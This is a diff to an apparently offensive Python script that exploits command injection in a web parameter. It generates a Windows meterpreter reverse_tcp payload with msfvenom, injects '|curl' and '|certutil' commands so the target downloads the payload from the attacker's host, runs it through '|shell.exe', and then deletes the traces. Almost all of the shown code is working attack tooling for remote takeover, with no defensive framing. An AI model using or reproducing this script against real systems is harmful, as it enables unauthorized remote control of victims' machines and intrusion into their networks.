@@ -4,6 +4,7 @@ import requests
 import argparse
 import sys
 import os
+import re
 
 
 def get_arguments():
@@ -65,6 +66,7 @@ else:
 
 if arguments.url:
     URL = arguments.url
+    RHOST = re.search("(\d{1,3}\.?){4}", URL)[0]
 else:
     print("[-] Please provide either URL")
     sys.exit()
@@ -84,18 +86,25 @@ if not arguments.LPORT:
 else:
     LPORT = arguments.LPORT
 
-os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe > shell.exe")
+try:
+    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe > shell.exe")
 
-os.system("python3 -m http.server 80 &")
+    print(f"[+] You'll need to host a web server at {LHOST}:{LPORT} at path " +
+          os.path.dirname(os.path.realpath(__file__)) + ".")
+    print(f"[...] sudo python3 -m http.server 80")
+    input("[*] Hit enter once done... ")
 
-response = send_request(URL, arguments.target,
-                        "|certutil.exe -urlcache -f http://" + LHOST + ":" + LPORT + "/shell.exe shell.exe ",
-                        arguments.param, cookies)
+    send_request(URL, arguments.target, "|curl " + LHOST + "/shell.exe -o shell.exe", arguments.param, cookies)
 
-response = send_request(URL, arguments.target, "|shell.exe", arguments.param, cookies)
+    print(f"""[+] You'll need to start a handler at LHOST:{LHOST}, LPORT:{LPORT} in msfconsole. 
+        Set Payload to windows/meterpreter/reverse_tcp. Set RHOST to """)
+    input("[*] Hit enter once done... ")
 
-with open("response.html", "w+") as file:
-    file.write(response.text)
-
-
-
+    send_request(URL, arguments.target, "|shell.exe", arguments.param, cookies)
+except KeyboardInterrupt:
+    print("[-] Interrupt observed. Exiting...")
+finally:
+    print("[-] Cleaning up...")
+    os.system("rm shell.exe")
+    send_request(URL, arguments.target, "|rm shell.exe", arguments.param, cookies)
+    sys.exit()
